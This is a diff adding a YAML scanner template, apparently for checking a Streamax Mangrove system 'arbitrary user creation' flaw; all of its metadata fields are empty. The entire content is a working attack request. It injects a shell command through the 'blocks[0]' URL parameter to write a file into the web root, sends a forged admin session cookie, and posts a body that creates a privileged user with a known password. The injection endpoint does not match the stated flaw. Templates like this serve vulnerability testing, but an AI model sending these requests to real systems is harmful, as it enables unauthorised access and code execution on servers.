@@ -1,0 +1,26 @@
+id:
+
+info:
+  name: 锐明技术Mangrove系统 任意用户创建漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%2712345%27%20>/var/www/html/test.php
+  headers:
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip, deflate
+    Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+  data: |
+    UserId=&GroupPower=1&VehiclePower=&UserName=poiuy&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=test1234
+response1:
+  body: true
+  code: 200
+requests2:
+response2:
